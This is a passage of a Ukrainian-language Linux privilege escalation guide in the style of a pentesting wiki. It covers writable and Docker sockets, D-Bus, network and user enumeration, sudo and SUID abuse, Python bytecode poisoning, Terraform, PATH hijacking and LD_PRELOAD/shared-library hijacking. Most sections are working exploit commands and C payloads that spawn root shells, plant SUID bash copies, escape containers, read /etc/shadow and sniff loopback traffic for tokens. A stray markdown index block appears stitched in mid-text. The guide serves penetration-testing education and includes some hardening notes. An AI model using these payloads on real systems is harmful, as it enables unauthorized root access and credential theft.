# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

Якщо ви **виявите будь-який доступний для запису сокет** (_зараз ми говоримо про Unix Sockets, а не про конфігураційні файли `.socket`_), тоді **ви можете взаємодіяти** з цим сокетом і, можливо, використати вразливість.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets, що слухають HTTP** запити (_я не говорю про .socket files, а про файли, що працюють як unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Якщо сокет **відповідає HTTP**-запитом, тоді ви можете **взаємодіяти** з ним і, можливо, **експлуатувати деяку вразливість**.

### Writable Docker Socket

Docker socket, який часто знаходиться за шляхом `/var/run/docker.sock`, є критичним файлом, який слід захищати. За замовчуванням він доступний для запису користувачу `root` і членам групи `docker`. Наявність права запису до цього сокета може призвести до privilege escalation. Ось розбір того, як це можна зробити, а також альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є доступ на запис до Docker socket, ви можете виконати privilege escalation за допомогою таких команд:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють вам запустити контейнер із root-рівнем доступу до файлової системи хоста.

#### **Using Docker API Directly**

У випадках, коли Docker CLI недоступний, Docker socket все ще можна керувати за допомогою Docker API та команд `curl`.

1.  **List Docker Images:** Отримайте список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення контейнера, який монтує кореневий каталог системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat`, щоб встановити з’єднання з контейнером, що дає змогу виконувати в ньому команди.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з’єднання `socat` ви можете виконувати команди безпосередньо в контейнері з root-рівнем доступу до файлової системи хоста.

### Others

Зверніть увагу: якщо у вас є права на запис у docker socket, тому що ви **всередині групи `docker`**, ви маєте [**більше способів підвищити привілеї**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API слухає на порту**], ви також можете скомпрометувати його](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **більше способів вийти з контейнерів або зловживати container runtimes, щоб підвищити привілеї** у:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявили, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявили, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система **міжпроцесної комунікації (IPC)**, яка дає змогу застосункам ефективно взаємодіяти та обмінюватися даними. Створена з урахуванням сучасної системи Linux, вона пропонує надійну framework для різних форм комунікації між застосунками.

Ця система є універсальною, підтримуючи базовий IPC, що покращує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Ба більше, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth daemon про вхідний дзвінок може змусити music player вимкнути звук, покращуючи user experience. Крім того, D-Bus підтримує систему віддалених об’єктів, спрощуючи запити до сервісів і виклики методів між застосунками, оптимізуючи процеси, які традиційно були складними.

D-Bus працює за моделлю **allow/deny**, керуючи дозволами на повідомлення (виклики методів, надсилання сигналів тощо) на основі сукупного ефекту правил policy, що збігаються. Ці policy визначають взаємодію з bus, потенційно даючи змогу підвищити привілеї через зловживання цими дозволами.

Приклад такої policy у `/etc/dbus-1/system.d/wpa_supplicant.conf` наведено нижче; він описує дозволи для root user на володіння, надсилання та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Policies без зазначеного user або group застосовуються глобально, тоді як policy контексту "default" застосовуються до всього, що не охоплено іншими конкретними policy.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як перераховувати та експлуатувати D-Bus communication тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Завжди цікаво перерахувати network і з’ясувати позицію машини.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Швидка тріаж-діагностика outbound filtering

Якщо хост може виконувати команди, але callbacks не проходять, швидко розділіть DNS, transport, proxy та route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до доступу до неї:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Класифікуйте listeners за bind target:

- `0.0.0.0` / `[::]`: exposed на всіх локальних інтерфейсах.
- `127.0.0.1` / `::1`: local-only (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usually reachable only from internal segments.

### Local-only service triage workflow

Коли ви compromise host, services, прив’язані до `127.0.0.1`, часто стають reachable уперше з вашого shell. Швидкий local workflow такий:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS як мережевий сканер (режим лише мережі)

Окрім локальних перевірок PE, linPEAS може працювати як зосереджений мережевий сканер. Він використовує доступні бінарні файли в `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює додаткові інструменти.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Якщо ви передаєте `-d`, `-p` або `-i` без `-t`, linPEAS працює як чистий мережевий сканер (пропускаючи решту перевірок privilege-escalation).

### Sniffing

Перевірте, чи можете ви sniff traffic. Якщо можете, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
Швидкі практичні перевірки:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) є особливо цінним у post-exploitation, тому що багато лише внутрішніх сервісів відкривають там tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture now, parse later:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Користувачі

### Generic Enumeration

Перевірте, **хто** ви, які **privileges** у вас є, які **users** є в системі, які з них можуть **login** і які мають **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux були вражені багом, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Більше інформації: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) і [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Використай його** за допомогою: **`systemd-run -t /bin/bash`**

### Groups

Перевір, чи ти є **членом якоїсь групи**, яка могла б надати тобі root-привілеї:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Перевір, чи є щось цікаве всередині clipboard (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** з середовища, **спробуйте увійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо вас не хвилює створення великого шуму, і на комп’ютері є binaries `su` та `timeout`, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання Writable PATH

### $PATH

Якщо ви виявили, що можете **записувати в будь-яку теку в $PATH**, ви можете підвищити привілеї, **створивши backdoor у записуваній теці** з назвою якоїсь команди, яка буде виконана іншим користувачем (краще root) і яка **не завантажується з теки, що розташована раніше** за вашу записувану теку в $PATH.

### SUDO and SUID

Вам можуть дозволяти виконувати певну команду через sudo, або вона може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють вам читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація sudo може дозволяти користувачу виконувати певну команду з привілеями іншого користувача без введення пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тож тепер тривіально отримати shell, додавши ssh key до каталогу root або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking** для завантаження довільної python library під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

Якщо **sudo-дозволений Python-скрипт** імпортує модуль, чий каталог пакета містить **writable `__pycache__`**, ви можете замінити кешований `.pyc` і отримати виконання коду від імені привілейованого користувача під час наступного імпорту.

- Чому це працює:
- CPython зберігає кеші байткоду в `__pycache__/module.cpython-<ver>.pyc`.
- Інтерпретатор перевіряє **header** (magic + timestamp/hash metadata, прив’язане до source), а потім виконує marshaled code object, що зберігається після цього header.
- Якщо ви можете **delete and recreate** кешований файл, тому що каталог writable, root-owned, але non-writable `.pyc` все одно можна замінити.
- Типовий шлях:
- `sudo -l` показує Python-скрипт або wrapper, який ви можете запускати як root.
- Цей скрипт імпортує локальний модуль з `/opt/app/`, `/usr/local/lib/...` тощо.
- Каталог `__pycache__` імпортованого модуля writable для вашого користувача або для всіх.

Швидка enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Якщо ви можете перевірити привілейований скрипт, визначте імпортовані модулі та їхній шлях кешу:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Зловживання робочим процесом:

1. Запустіть скрипт, дозволений через sudo, один раз, щоб Python створив легітимний cache-файл, якщо він ще не існує.
2. Зчитайте перші 16 байтів із легітимного `.pyc` і повторно використайте їх у poisoned-файлі.
3. Зберіть payload code object, `marshal.dumps(...)` його, видаліть оригінальний cache-файл і створіть його заново з оригінальним header плюс вашим шкідливим bytecode.
4. Повторно запустіть скрипт, дозволений через sudo, щоб import виконав ваш payload як root.

Важливі примітки:

- Повторне використання оригінального header є ключовим, тому що Python перевіряє метадані cache щодо source file, а не чи bytecode body справді відповідає source.
- Це особливо корисно, коли source file належить root і не є writable, але каталог `__pycache__`, що містить його, writable.
- Атака не спрацює, якщо privileged process використовує `PYTHONDONTWRITEBYTECODE=1`, імпортує з розташування із safe permissions або прибирає write access до кожного каталогу в import path.

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Ensure no directory in the privileged Python import path is writable by low-privileged users, including `__pycache__`.
- For privileged runs, consider `PYTHONDONTWRITEBYTECODE=1` and periodic checks for unexpected writable `__pycache__` directories.
- Treat writable local Python modules and writable cache directories the same way you would treat writable shell scripts or shared libraries executed by root.

### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Чому це працює: для неінтерактивних shell Bash оцінює `$BASH_ENV` і підключає цей файл перед запуском цільового script. Багато sudo rules дозволяють запускати script або shell wrapper. Якщо `BASH_ENV` збережено sudo, ваш файл підключається з root privileges.

- Вимоги:
- sudo rule, яку ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash script).
- `BASH_ENV` присутній в `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
- Уникайте shell wrappers для команд, дозволених через sudo; використовуйте мінімальні binaries.
- Розгляньте sudo I/O logging та alerting, коли використовуються збережені env vars.

### Terraform via sudo with preserved HOME (!env_reset)

If sudo залишає environment intact (`!env_reset`) while allowing `terraform apply`, `$HOME` залишається як у користувача, що викликає. Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.

- Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform зірве Go plugin handshake, але виконає payload як root перед тим, як завершитися, залишивши позаду SUID shell.

### TF_VAR overrides + symlink validation bypass

Terraform variables can be provided via `TF_VAR_<name>` environment variables, which survive when sudo preserves the environment. Weak validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` can be bypassed with symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform розв'язує symlink і копіює реальний `/root/root.txt` у місце призначення, яке може прочитати attacker. Такий самий підхід можна використати, щоб **записувати** у privileged paths, заздалегідь створюючи destination symlinks (наприклад, вказуючи destination path провайдера всередину `/etc/cron.d/`).

### requiretty / !requiretty

На деяких старіших дистрибутивах sudo можна налаштувати з `requiretty`, що змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або опцію взагалі відсутньо), sudo можна запускати з non-interactive контекстів, таких як reverse shells, cron jobs або scripts.
```bash
Defaults !requiretty
```
Це не є прямою вразливістю саме по собі, але розширює ситуації, де правила `sudo` можна зловживати без потреби в повному PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, що містить записи, доступні для запису з боку атакувальника (наприклад, `/home/<user>/bin`), будь-яку відносну команду всередині `sudo`-дозволеної цілі можна затінити.

- Вимоги: правило `sudo` (часто `NOPASSWD`), яке запускає script/binary, що викликає команди без абсолютних шляхів (`free`, `df`, `ps`, тощо), і запис `PATH`, доступний для запису, який шукається першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Обхід шляхів виконання через Sudo
**Jump** до читання інших файлів або використовуйте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Якщо **sudo permission** надано для однієї команди **без зазначення шляху**: _hacker10 ALL= (root) less_, це можна експлуатувати, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** binary **виконує іншу команду без указання шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Якщо **suid** binary **виконує іншу команду із вказанням шляху**, тоді ви можете спробувати **export a function**, названу так само, як command, яку викликає suid файл.

Наприклад, якщо suid binary викликає _**/usr/sbin/service apache2 start**_, вам потрібно спробувати створити function і export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте `suid` binary, ця function буде виконана

### Writable script executed by a SUID wrapper

Поширена custom-app misconfiguration — це root-owned SUID binary wrapper, який виконує script, while the script itself is writable by low-priv users.

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Якщо `/usr/local/bin/backup.sh` доступний для запису, ви можете додати payload-команди, а потім виконати SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Швидкі перевірки:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Цей шлях атаки особливо поширений у "maintenance"/"backup" wrappers, що постачаються в `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказання однієї або кількох shared libraries (.so files), які loader має завантажити перед усіма іншими, включно зі standard C library (`libc.so`). Цей процес називається preloading a library.

Однак, щоб підтримувати безпеку системи та запобігти зловживанню цією функцією, особливо з **suid/sgid** executables, система застосовує певні умови:

- Loader ігнорує **LD_PRELOAD** для executables, де real user ID (_ruid_) не збігається з effective user ID (_euid_).
- Для executables із suid/sgid завантажуються лише libraries у standard paths, які також є suid/sgid.

Privilege escalation може статися, якщо ви маєте змогу виконувати команди з `sudo`, і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися та розпізнаватися навіть під час запуску команд через `sudo`, що потенційно може призвести до виконання arbitrary code з підвищеними privileges.
```
Defaults        env_keep += LD_PRELOAD
```
```markdown
# Privilege Escalation

У Linux немає "rootning" для еквівалента iOS, але ви можете отримати root-права різними способами, якщо є уразливість, помилка конфігурації або відомі облікові дані користувача. Будь-який спосіб отримати root-права з обліковими даними іншого користувача відомий як **Privilege Escalation**.

Ця сторінка містить деякі техніки для отримання root-прав на Linux. Ви також можете знайти більше інформації про **Privilege Escalation** у [linux local enumerations](../linux-local-enumeration/README.md).

## Checks

### Kernel exploits

Дивіться [Linux Kernel Exploits](/linux-hardening/privilege-escalation/linux-kernel-exploits)

### SUID binaries

Дивіться [SUID binaries](/linux-hardening/privilege-escalation/suid-binaries)

### Shared libraries

Дивіться [Shared libraries](/linux-hardening/privilege-escalation/shared-libraries)

### Capabilities

Дивіться [Capabilities](/linux-hardening/privilege-escalation/capabilities)

### Misconfigured services

Дивіться [Misconfigured services](/linux-hardening/privilege-escalation/misconfigured-services)

### Cron jobs

Дивіться [Cron jobs](/linux-hardening/privilege-escalation/cron-jobs)

### Writable files

Дивіться [Writable files](/linux-hardening/privilege-escalation/writable-files)

### NFS

Дивіться [NFS](/linux-hardening/privilege-escalation/nfs)

### No root squash

Дивіться [No root squash](/linux-hardening/privilege-escalation/no-root-squash)

### Container breakout

Дивіться [Container breakout](/linux-hardening/privilege-escalation/container-breakout)

### Docker breakout

Дивіться [Docker breakout](/linux-hardening/privilege-escalation/docker-breakout)

### LD_PRELOAD

Дивіться [LD_PRELOAD](/linux-hardening/privilege-escalation/ld_preload)

### PATH hijacking

Дивіться [PATH hijacking](/linux-hardening/privilege-escalation/path-hijacking)

### Python library hijacking

Дивіться [Python library hijacking](/linux-hardening/privilege-escalation/python-library-hijacking)

### Ruby library hijacking

Дивіться [Ruby library hijacking](/linux-hardening/privilege-escalation/ruby-library-hijacking)

### Polkit

Дивіться [Polkit](/linux-hardening/privilege-escalation/polkit)
```
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Then **compile it** using:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **підвищте привілеї**, запустивши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc можна зловжити, якщо атакувальник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях, де будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви натрапляєте на binary з дозволами **SUID**, який здається незвичним, варто перевірити, чи правильно він завантажує файли **.so**. Це можна перевірити, запустивши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, зіткнення з помилкою на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість для exploitation.

Щоб exploit це, слід створити C file, наприклад _"/path/to/.config/libcalc.c"_, що містить такий code:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпулювання правами доступу до файлів і запуску shell з підвищеними привілеями.

Скомпілюйте наведений вище C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Зрештою, запуск ураженого SUID binary має запустити exploit, що відкриває можливість компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID-бінарник, який завантажує бібліотеку з папки, куди ми можемо записувати, створімо бібліотеку в цій папці з потрібною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку на кшталт
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторований список Unix binaries, які можуть бути exploited attacker'ом, щоб обійти local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише inject arguments** у command.

Проєкт збирає legitimate functions Unix binaries, які можна abuse, щоб вийти з restricted shells, escalate або maintain elevated privileges, transfer files, spawn bind and reverse shells, а також полегшувати інші post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
